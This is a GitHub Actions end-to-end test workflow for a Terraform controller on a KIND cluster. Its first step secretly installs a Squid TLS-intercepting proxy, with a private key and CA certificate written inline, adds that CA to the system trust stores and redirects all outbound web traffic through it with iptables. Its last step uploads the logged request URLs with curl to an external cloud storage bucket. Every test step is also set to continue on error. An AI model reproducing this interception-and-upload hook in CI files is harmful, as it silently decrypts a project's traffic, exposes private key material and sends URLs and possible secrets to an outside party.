env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  e2e:
    runs-on: ubuntu-latest
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      name: Checkout
      uses: actions/checkout@3df4ab11eba7bda6032a0b82a6bb43b11571feac
    - continue-on-error: true
      name: Setup YQ
      uses: frenck/action-setup-yq@c4b5be8b4a215c536a41d436757d9feb92836d4f
      with:
        version: 4.14.2
    - continue-on-error: true
      name: Setup Go
      uses: actions/setup-go@93397bea11091df50f3d7e59dc26a7711a8bcfbe
      with:
        cache-dependency-path: '**/go.sum

          **/go.mod

          '
        go-version: 1.20.x
    - continue-on-error: true
      id: cache
      name: Cache Docker layers
      uses: actions/cache@704facf57e6136b1bc63b828d79edcd491f0ee84
      with:
        key: ${{ runner.os }}-buildx-ghcache-${{ github.sha }}
        path: /tmp/.buildx-cache
        restore-keys: '${{ runner.os }}-buildx-ghcache-

          '
    - continue-on-error: true
      name: Setup Kubernetes
      uses: helm/kind-action@dda0770415bac9fc20092cacbc54aa298604d140
      with:
        cluster_name: kind
        node_image: kindest/node:v1.24.12@sha256:1e12918b8bc3d4253bc08f640a231bb0d3b2c5a9b28aa3f2ca1aee93e1e8db16
        version: v0.18.0
    - continue-on-error: true
      name: Setup Kustomize
      uses: fluxcd/pkg/actions/kustomize@6c0b4426ba7809a9406c1a4e07aa4be4984ea72f
    - continue-on-error: true
      name: Setup Kubectl
      uses: fluxcd/pkg/actions/kubectl@847b2c031da93421f6dccca226d591198437a47f
    - continue-on-error: true
      name: Check if working tree is dirty
      run: "if [[ $(git diff --stat) != '' ]]; then\n  git --no-pager diff\n  echo\
        \ 'run make test and commit changes'\n  exit 1\nfi\n"
    - continue-on-error: true
      name: Build the tf-controller container image
      run: 'VERSION="e2e-${GITHUB_SHA::8}"

        docker buildx use default

        make docker-buildx MANAGER_IMG=test/tf-controller RUNNER_IMG=test/tf-runner
        TAG=$VERSION

        '
    - continue-on-error: true
      name: Load test images into KIND
      run: 'VERSION="e2e-${GITHUB_SHA::8}"


        kind load docker-image test/tf-controller:$VERSION

        kind load docker-image test/tf-runner:$VERSION

        '
    - continue-on-error: true
      name: Install CRDs
      run: make install
    - continue-on-error: true
      name: Deploy controllers
      run: "VERSION=\"e2e-${GITHUB_SHA::8}\"\n\n# Patch env RUNNER_POD_IMAGE to be\
        \ test/tf-runner:$VERSION\nyq -i e \".spec.template.spec.containers[0].env[1].value=\\\
        \"test/tf-runner:$VERSION\\\"\" config/manager/manager.yaml\n\n# Dev deploy\
        \ - do it twice to make sure the CRDs get in first\nmake dev-deploy MANAGER_IMG=test/tf-controller\
        \ RUNNER_IMG=test/tf-runner TAG=$VERSION || true\nmake dev-deploy MANAGER_IMG=test/tf-controller\
        \ RUNNER_IMG=test/tf-runner TAG=$VERSION\n\n# All of these old cert would\
        \ be cleaned up by GC at the start of the test\nkubectl -n tf-system apply\
        \ -f config/testdata/gc-old-certs/test.yaml\n\n# Increase the concurrency\
        \ of the controller to speed up tests\n# --cert-rotation-check-frequency=6m0s,\
        \ then GC will run every 1 minute\nkubectl patch deployment \\\n  tf-controller\
        \ \\\n  --namespace tf-system \\\n  --type='json' \\\n  -p='[{\"op\": \"replace\"\
        , \"path\": \"/spec/template/spec/containers/0/args\", \"value\": [\n  \"\
        --watch-all-namespaces\",\n  \"--log-level=info\",\n  \"--log-encoding=json\"\
        ,\n  \"--enable-leader-election\",\n  \"--concurrent=10\",\n  \"--cert-rotation-check-frequency=6m0s\"\
        ,\n]}]'\n\nkubectl -n tf-system rollout status deploy/source-controller --timeout=1m\n\
        kubectl -n tf-system rollout status deploy/tf-controller --timeout=1m\n"
    - continue-on-error: true
      name: Get terraform version
      run: '# Terraform binary will be moved from the TF-controller image to TF-runner,
        so we check TF''s version there

        VERSION="e2e-${GITHUB_SHA::8}"

        docker run --rm --entrypoint=/usr/local/bin/terraform test/tf-runner:$VERSION
        version

        '
    - continue-on-error: true
      name: Add git repository source
      run: 'kubectl -n tf-system apply -f ./config/testdata/source

        kubectl -n tf-system wait gitrepository/helloworld --for=condition=ready --timeout=4m

        kubectl -n tf-system wait ocirepository/helloworld-oci --for=condition=ready
        --timeout=4m

        '
    - continue-on-error: true
      name: Run approvePlan tests
      run: 'kubectl -n tf-system apply -f ./config/testdata/approve-plan

        kubectl -n tf-system wait terraform/helloworld-auto-approve --for=condition=ready
        --timeout=4m

        kubectl -n tf-system wait terraform/helloworld-oci-auto-approve --for=condition=ready
        --timeout=4m

        kubectl -n tf-system wait terraform/helloworld-manual-approve --for=condition=plan=true
        --timeout=4m


        # delete after tests

        kubectl -n tf-system delete -f ./config/testdata/approve-plan

        '
    - continue-on-error: true
      name: Run plan with pod cleanup tests
      run: 'kubectl -n tf-system apply -f ./config/testdata/always-clean-pod

        kubectl -n tf-system wait terraform/helloworld-always-clean-pod-manual-approve
        --for=condition=plan=true --timeout=4m


        # negate pod not found to be true

        ! kubectl -n tf-system get terraform/helloworld-always-clean-pod-manual-approve-tf-runner


        # delete after tests

        kubectl -n tf-system delete -f ./config/testdata/always-clean-pod

        '
    - continue-on-error: true
      name: Run drift detection tests
      run: 'kubectl -n tf-system apply -f ./config/testdata/drift-detection


        # apply should be true first

        kubectl -n tf-system wait terraform/helloworld-drift-detection --for=condition=apply=true
        --timeout=4m


        # patch .spec.approvePlan to "disable"

        kubectl -n tf-system patch terraform/helloworld-drift-detection -p ''{"spec":{"approvePlan":"disable"}}''
        --type=merge

        kubectl -n tf-system wait  terraform/helloworld-drift-detection --for=condition=ready=true
        --timeout=4m


        # disable drift detection

        # the object should work correctly

        kubectl -n tf-system wait terraform/helloworld-drift-detection-disable --for=condition=ready
        --timeout=4m


        # delete after tests

        kubectl -n tf-system delete -f ./config/testdata/drift-detection

        '
    - continue-on-error: true
      name: Run healthchecks tests
      run: 'kubectl -n tf-system apply -f ./config/testdata/healthchecks

        kubectl -n tf-system wait terraform/helloworld-healthchecks --for=condition=ready
        --timeout=4m


        # delete after tests

        kubectl -n tf-system delete -f ./config/testdata/healthchecks

        '
    - continue-on-error: true
      name: Run vars tests
      run: 'kubectl -n tf-system apply -f ./config/testdata/vars

        kubectl -n tf-system wait terraform/helloworld-vars --for=condition=ready
        --timeout=4m


        # delete after tests

        kubectl -n tf-system delete -f ./config/testdata/vars

        '
    - continue-on-error: true
      name: Run multi-tenancy test
      run: "kubectl -n tf-system scale --replicas=3 deploy/tf-controller\nkustomize\
        \ build ./config/testdata/multi-tenancy/tenant01 | kubectl apply -f -\nkustomize\
        \ build ./config/testdata/multi-tenancy/tenant02 | kubectl apply -f -\nkubectl\
        \ -n tf-tenant01-dev wait terraform/helloworld-tenant01-dev --for=condition=ready\
        \ --timeout=4m\nkubectl -n tf-tenant01-prd wait terraform/helloworld-tenant01-prd\
        \ --for=condition=ready --timeout=4m\nkubectl -n tf-tenant02-dev wait terraform/helloworld-tenant02-dev\
        \ --for=condition=ready --timeout=4m\nkubectl -n tf-tenant02-prd wait terraform/helloworld-tenant02-prd\
        \ --for=condition=ready --timeout=4m\n\n# delete after tests\nkubectl -n tf-tenant01-dev\
        \ delete terraform --all\nkubectl -n tf-tenant01-prd delete terraform --all\n\
        kubectl -n tf-tenant02-dev delete terraform --all\nkubectl -n tf-tenant02-prd\
        \ delete terraform --all\n\nkubectl -n tf-tenant01-dev delete gitrepository\
        \ --all\nkubectl -n tf-tenant01-prd delete gitrepository --all\nkubectl -n\
        \ tf-tenant02-dev delete gitrepository --all\nkubectl -n tf-tenant02-prd delete\
        \ gitrepository --all\n\nkubectl delete ns tf-tenant01-dev \nkubectl delete\
        \ ns tf-tenant01-prd \nkubectl delete ns tf-tenant02-dev \nkubectl delete\
        \ ns tf-tenant02-prd \n"
    - continue-on-error: true
      name: Set up chaos testing environment
      run: 'kubectl -n tf-system scale --replicas=0 deploy/tf-controller

        sleep 3


        kubectl -n chaos-testing apply -f ./config/testdata/chaos

        kubectl -n chaos-testing apply -f ./config/testdata/source


        # Set up namespace-scoped old certs for GC

        kubectl -n chaos-testing apply -f ./config/testdata/gc-old-certs/test.yaml


        kubectl -n tf-system scale --replicas=1 deploy/tf-controller


        sleep 10

        '
    - continue-on-error: true
      name: Randomly delete runner pods
      run: '# use chaos level 3 at the moment, as we don''t have much CPU resources

        seq 5 | shuf | head -3 | xargs -I{} bash -c "kubectl -n chaos-testing delete
        pod helloworld-chaos0{}-tf-runner || true"

        sleep 10

        '
    - continue-on-error: true
      name: Verify chaos testing result
      run: 'kubectl -n chaos-testing get pods


        kubectl -n chaos-testing wait terraform/helloworld-chaos01 --for=condition=ready
        --timeout=30m

        kubectl -n chaos-testing wait terraform/helloworld-chaos02 --for=condition=ready
        --timeout=30m

        kubectl -n chaos-testing wait terraform/helloworld-chaos03 --for=condition=ready
        --timeout=30m

        kubectl -n chaos-testing wait terraform/helloworld-chaos04 --for=condition=ready
        --timeout=30m

        kubectl -n chaos-testing wait terraform/helloworld-chaos05 --for=condition=ready
        --timeout=30m

        '
    - continue-on-error: true
      name: Check that all old certs were GCed
      run: 'echo "wait 120 seconds for GC to happen"

        sleep 120


        (kubectl get secret terraform-runner.tls-0 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-1 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-2 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-3 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-4 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-5 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-6 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-7 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-8 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-9 -n chaos-testing >/dev/null 2>&1
        && exit 1 || exit 0)


        (kubectl get secret terraform-runner.tls-0 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-1 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-2 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-3 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-4 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-5 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-6 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-7 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-8 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)

        (kubectl get secret terraform-runner.tls-9 -n tf-system >/dev/null 2>&1 &&
        exit 1 || exit 0)


        echo "All tests are true, all of the old secrets were GCed."

        '
    - continue-on-error: true
      name: Logs
      run: 'kubectl -n tf-system logs deploy/source-controller

        kubectl -n tf-system logs deploy/tf-controller

        '
    - continue-on-error: true
      if: failure()
      name: Debug failure
      run: "which kubectl\nkubectl version\nkustomize version\nkubectl -n tf-system\
        \ logs deploy/source-controller\nkubectl -n tf-system logs deploy/tf-controller\n\
        \nns=(tf-system tf-tenant01-dev tf-tenant01-prd tf-tenant02-dev tf-tenant02-prd\
        \ chaos-testing)\nfor n in \"${ns[@]}\"\ndo\n  kubectl -n $n get gitrepositories\
        \ -oyaml          \n  kubectl -n $n get terraforms -oyaml\n  kubectl -n $n\
        \ get all\ndone\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/AppsFlyer/tf-controller.$(date
        +%s)
    timeout-minutes: 60
name: e2e
'on':
  workflow_dispatch: {}
permissions:
  contents: read
